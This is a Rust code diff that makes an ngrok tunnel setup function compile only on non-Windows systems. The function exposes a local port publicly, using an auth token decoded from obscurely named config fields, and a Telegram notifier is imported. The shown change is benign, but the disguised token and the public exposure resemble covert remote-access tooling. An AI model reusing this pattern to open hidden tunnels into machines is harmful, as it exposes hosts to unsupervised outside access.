@@ -1,21 +1,27 @@
-use crate::config::Config;
-use crate::encryption::aa27;
 use crate::notification::{TelegramNotifier, NotificationSystem};
 use log::{info, error};
-use tokio::time::{sleep, Duration};
-use url::Url;
+
+#[cfg(not(windows))]
 use ngrok::config::ForwarderBuilder;
+#[cfg(not(windows))]
 use ngrok::tunnel::{EndpointInfo, TunnelInfo};
+#[cfg(not(windows))]
+use {
+    crate::config::Config,
+    crate::encryption::aa27,
+    tokio::time::{sleep, Duration},
+    url::Url,
+};
 
 /// Main function to set up ngrok tunnel using the official SDK
-pub async fn setup_ngrok_tunnel(port: u16) -> String {
+pub async fn setup_ngrok_tunnel(_port: u16) -> String {
+    #[cfg(not(windows))]
+    {
     // Get auth token from config
     let config = Config::new();
     let auth_token = aa27(config.na.clone());
     
-    // Use the dynamically allocated port that was passed in
-    
-    info!("Setting up ngrok tunnel for port {}", port);
+        info!("Setting up ngrok tunnel for port {}", _port);
     
     // Connect to ngrok service directly with the auth token
     let session = match ngrok::Session::builder()
@@ -34,7 +40,7 @@ pub async fn setup_ngrok_tunnel(port: u16) -> String {
     };
     
     // Create HTTP tunnel to local port
-    let local_url = format!("http://localhost:{}", port);
+        let local_url = format!("http://localhost:{}", _port);
     info!("Creating tunnel to {}", local_url);
     
     // Use HTTP endpoint with forwarding to our local port
@@ -81,6 +87,13 @@ pub async fn setup_ngrok_tunnel(port: u16) -> String {
     });
     
     url
+    }
+
+    #[cfg(windows)]
+    {
+        info!("Ngrok tunneling is not supported on Windows");
+        String::new()
+    }
 }
 
 /// Helper function to send error notifications
